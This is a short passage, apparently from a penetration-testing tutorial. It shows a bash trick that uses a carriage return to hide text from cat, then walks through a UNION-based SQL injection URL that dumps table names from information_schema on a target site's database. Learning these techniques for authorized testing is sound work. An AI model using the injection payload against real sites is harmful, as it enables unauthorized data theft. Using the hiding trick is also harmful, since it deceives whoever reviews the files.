carriage return for hiding the text line from cat
```bash
echo -e "text\r                         " > some_file
cat some_file
```

Extracting tables from the database
Now let’s try extracting all the tables from the database “nilakantatrust”.

`http://192.168.2.3/news-and-events.php?id=-22 union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema=database()—`



Figure 10

Figure 10 shows all the tables dumped from the database “nilakantatrust”.

Information_schema is the table which contains meta-data, nothing but information about all the tables and columns of the database.
